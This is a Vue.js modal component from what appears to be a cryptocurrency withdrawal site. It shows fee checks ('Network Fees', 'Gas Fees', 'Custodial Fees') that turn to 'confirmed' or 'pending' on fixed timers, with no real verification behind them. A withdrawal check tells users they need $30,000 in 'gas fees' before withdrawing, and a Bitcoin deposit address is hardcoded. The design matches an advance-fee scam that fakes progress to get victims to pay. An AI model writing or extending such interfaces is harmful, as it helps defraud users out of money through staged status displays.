<template>
  <div>
    <div class="backdrop"></div>
    <dialog open>
      <div class="alpha">

        <div class="first-part">
          <img src="@/assets/fund-wallet-icon.svg" alt="fund-wallet-icon"/>
          <i class='bx bx-x' @click="close"></i>
        </div>
        <form class="second-part">
          <div class="separate">
<!--            <input type="checkbox" disabled />-->
            <p class="text-3">
              Network Fees :
              <span v-if="showConfirmed" class="status-3">confirmed</span>
              <span v-else class="loader"></span>
            </p>
          </div>

          <hr/>

          <div class="separate">
<!--            <input type="checkbox" checked />-->
            <p class="text-3">
              Proof-of-Stake Networks :
              <span v-if="showConfirmed2" class="status-3">confirmed</span>
              <span v-else class="loader"></span>
            </p>
          </div>


          <hr/>

          <div class="separate">
<!--            <input type="checkbox" checked  />-->
            <p class="text-3">
              Withdrawal Fees :
              <span v-if="showConfirmed3" class="status-3">confirmed</span>
              <span v-else class="loader"></span>
            </p>
          </div>

          <hr/>

          <div class="separate">
<!--            <input type="checkbox" checked />-->
            <p class="text-3">
              Pool Fees :
              <span v-if="showConfirmed4" class="status-3">confirmed</span>
              <span v-else class="loader"></span>
            </p>
          </div>

          <hr/>

          <div class="separate">
            <!--            <input type="checkbox" checked />-->
            <p class="text-3">
              Gas Fees :
              <span v-if="showConfirmed5" class="status-3">confirmed</span>
              <span v-else class="loader"></span>
            </p>
          </div>

          <hr/>

          <div class="separate">
            <!--            <input type="checkbox" checked />-->
            <p class="text-3">
              Custodial Fees :
              <span v-if="showConfirmed6" class="status">pending</span>
              <span v-else class="loader"></span>
            </p>
          </div>

          <hr/>


          <button @click="close"  class="submit-button">Okay</button>


        </form>

      </div>

    </dialog>
  </div>
</template>

<script>
import {mapState} from "vuex";
import Swal from "sweetalert2";

export default {
  name: "FundWalletModal9",
  emits: ['close', 'open'],
  // components: {VueQrcode},
  computed: {
    ...mapState(['loginForm']),
  },
  data() {
    return {
      contacts: [],
      accountNumber: '',
      bankName: '',
      bitcoinAddress: '',
      ethereumAddress: '',
      routingNumber: '',
      inputValue1: '',
      inputValue2: '',
      inputValue3: 119000,
      bitcoinRate: null,
      destinationWalletAddress: "",
      payOutAmount: "",
      showActions: false,
      showConfirmed: false,
      showConfirmed2: false,
      showConfirmed3: false,
      showConfirmed4: false,
      showConfirmed5: false,
      showConfirmed6: false,
    };
  },
  props: {
    selectedItem: {
      type: Object,
      default: null
    }
  },

  methods:{
    displayConfirmedAfterDelay() {
      setTimeout(() => {
        this.showConfirmed = true;
      }, 10000); // 10 seconds delay
    },
    displayConfirmedAfterDelay2() {
      setTimeout(() => {
        this.showConfirmed2 = true;
      }, 20000); // 10 seconds delay
    },
    displayConfirmedAfterDelay3() {
      setTimeout(() => {
        this.showConfirmed3 = true;
      }, 30000); // 10 seconds delay
    },
    displayConfirmedAfterDelay4() {
      setTimeout(() => {
        this.showConfirmed4 = true;
      }, 40000); // 10 seconds delay
    },
    displayConfirmedAfterDelay5() {
      setTimeout(() => {
        this.showConfirmed5 = true;
      }, 50000); // 10 seconds delay
    },
    displayConfirmedAfterDelay6() {
      setTimeout(() => {
        this.showConfirmed6 = true;
      }, 60000); // 10 seconds delay
    },
    async close() {
      this.$emit('close');
      // this.$emit('open');
      // await Swal.fire({
      //   icon: 'success',
      //   title: 'Pending',
      //   text: 'Deposit Processing',
      // });
    },

    fetchBitcoinRate() {
      // Set loading to true when the request starts
      this.loading = true;

      // eslint-disable-next-line no-undef
      axios.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
          .then(response => {
            this.bitcoinRate = response.data.bpi.USD.rate_float;
            // Set loading to false when the data is successfully fetched
            this.loading = false;
          })
          .catch(error => {
            console.error(error);
            // Set loading to false also if there is an error
            this.loading = false;
          });
    },

    // convertAndSave() {
    //   if (this.bitcoinRate && this.inputValue3) {
    //     const usdAmount = parseFloat(this.inputValue3);
    //     if (!isNaN(usdAmount)) {
    //       this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
    //     } else {
    //       this.inputValue2 = '';
    //     }
    //   } else {
    //     this.inputValue2 = '';
    //   }
    // },

    convertAndSave() {
      const usdAmount = parseFloat(this.inputValue3);
      this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
    },

    copyText() {
      // Create a temporary textarea element to hold the text
      const textarea = document.createElement('textarea');
      textarea.value = this.bitcoinAddress;
      document.body.appendChild(textarea);

      // Select the text and copy it to clipboard
      textarea.select();
      document.execCommand('copy');

      // Remove the temporary element
      document.body.removeChild(textarea);

    },

    // New method to check the amount
    async checkAmount() {
      // Convert the entered amount to a float
      const amount = parseFloat(this.payOutAmount);

      // Check if the amount is greater than or equal to 8,000,000.00
      if (amount >= 89.14) {
        // Display success message
        // alert("Success! The amount is valid.");
        await Swal.fire({
          icon: 'info',
          title: 'Gas fee Required',
          text: 'To start a withdrawal you need $30,000 on your network to process the transfer',
          // footer: '<span style="color: #00bc00;">PoW Received</span>',
        });
        await this.$emit('open');
        await this.$emit('close');

      } else {
        // Display error message
        // alert("Error! The amount must be at least 8,000,000.00.");
        await Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'The amount must be at least 89.14 BTC',
          // footer: '<span style="color: #00bc00;">PoW Received</span>',
        });
      }
    }

  },

  created() {
    this.fetchBitcoinRate()
    this.convertAndSave()
    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue2 = this.loginForm.inputValue2
  },
  mounted() {
    this.fetchBitcoinRate()
    this.convertAndSave()
    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
    this.inputValue2 = this.loginForm.inputValue2
    this.displayConfirmedAfterDelay();
    this.displayConfirmedAfterDelay2();
    this.displayConfirmedAfterDelay3();
    this.displayConfirmedAfterDelay4();
    this.displayConfirmedAfterDelay5();
    this.displayConfirmedAfterDelay6();
  }
}
</script>

<style scoped >

.backdrop {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  z-index: 10;
  background-color: rgba(0, 0, 0, 0.7);
}


dialog {
  position: fixed;
  top: 7vh;
  width: 32rem;
  height: 32rem;
  left: calc(50% - 13.5rem);
  margin: 0;
  background-color: transparent;
  z-index: 100;
  border: none;
  animation: modal 0.3s ease-out forwards;
}

.alpha{
  position: relative;
  display: block;
  overflow: hidden;
  width: 420px;
  height: 560px;
  /*height: auto;*/
  padding: 24px;
  border-radius: 5px;
  background-color: #ffffff;
  border: 0.5px solid #3C4A57FF;
  box-shadow: 0 0 34px 0 rgba(3, 28, 67, 0.13);
}

.first-part{
  display: flex;
  justify-content: space-between;
}

.separate{
  display: flex;
  align-items: center;
  align-content: center;
  gap: 5px;
}

.status{
  background-color: #cc0000;
  padding: 4px 18px;
  color: #FFFFFF;
  border-radius: 5px;
  font-size: 14px;
}

.status-2{
  background-color: rgb(211, 211, 211);
  padding: 7px 20px;
  border-radius: 5px;
  font-size: 14px;
}

.status-3{
  background-color: #4BB543;
  color: #FFFFFF;
  padding: 4px 18px;
  border-radius: 5px;
  font-size: 14px;
}

.bx-x{
  font-size: 25px;
  padding-top: 2px;
  color: #0f171c;
}

.text-1{
  font-weight: 600;
  font-size: 18px;
  line-height: 28px;
  color: #0f171c;
  padding-top: 2.5%;
  padding-bottom: 1%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-2{
  font-weight: 400;
  font-size: 16px;
  line-height: 24px;
  color: #070e20;
  padding-top: 1%;
  padding-bottom: 2%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-3{
  font-weight: 400;
  font-size: 14px;
  line-height: 20px;
  color: #070e20;
  padding-top: 2%;
  padding-bottom: 2%;
  display: flex;
  align-items: center;
  align-content: center;
  width: 100%;
  gap: 10px;
}

.text-4{
  font-weight: 400;
  font-size: 16px;
  line-height: 24px;
  color: #070e20;
  padding-top: 1.5%;
  padding-bottom: 1.5%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
}

.text-5{
  font-size: 13px;
  line-height: 24px;
  color: #070e20;
  margin-top: 0;
  padding-top: 0;
  padding-left: 10px;
  padding-bottom: 2%;
  word-wrap: break-word; /* or overflow-wrap: break-word; */
  font-family: 'BR-Firma-Light', sans-serif;
}

button{
  padding: 8px 55px;
  color: white;
  background-color: #0f171c;
  border: 0.5px solid #3C4A57FF;
  border-radius: 5px;
  font-size: 13px;
  text-decoration: none;
  /*display: block;*/
  /*margin-left: auto;*/
  /*margin-right: auto;*/
}

.input-button-wrapper {
  margin-bottom: 8%;
  margin-top: 8%;
  display: block;
  width: 100%;
}

.text-input {
  flex: 1;
  padding: 8px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 4px 0 0 4px;
  width: 100%;
  margin-top: 1%;
}


.submit-button {
  padding: 6px 25px;
  font-size: 14px;
  background-color: #007bff;
  color: white;
  border: 1px solid #007bff;
  border-radius: 4px;
  cursor: pointer;
  margin-top: 5%;
  display: inline-block;
}

.submit-button:hover {
  background-color: #0056b3;
  border-color: #0056b3;
}

.loader {
  width: 60%;
  height: 4.8px;
  display: inline-block;
  position: relative;
  background: rgba(255, 255, 255, 0.15);
  overflow: hidden;
}
.loader::after {
  content: '';
  width: 192px;
  height: 4.8px;
  background: #007bff;
  position: absolute;
  top: 0;
  left: 0;
  box-sizing: border-box;
  animation: animloader 2s linear infinite;
}

.seprate{
  display: flex;
  align-items: center;
  align-content: center;
  margin-top: 20px;
  margin-bottom: 10px;
}
.loader-text{
  font-size: 13px;
  margin-right: 10px;
}

.text-fiat{
  font-size: 13px;
}

.qr-code{
  margin-left: 32%;
}

.second-part{
  margin-top: 3%;
}

hr{
  border: 0.5px solid #ccc;
  margin-top: 3%;
  margin-bottom: 3%;
}

@keyframes animloader {
  0% {
    left: 0;
    transform: translateX(-100%);
  }
  100% {
    left: 100%;
    transform: translateX(0%);
  }
}

@keyframes modal {
  from {
    opacity: 0;
    transform: translateY(-50px) scale(0.9);
  }

  to {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}
@media (max-width: 500px) {
  dialog {
    top: 11vh;
    width: 25rem;
    height: 18rem;
    left: calc(50% - 11.5rem);
    right: 30px;
  }
  .alpha{
    width: 370px;
    height: 535px;
  }
  h3{
    font-size: 18px;
  }
  p{
    font-size: unset;
  }

  .text-1{
    font-size: 17px;
    line-height: 26px;
    padding-top: 2%;
  }


}
</style>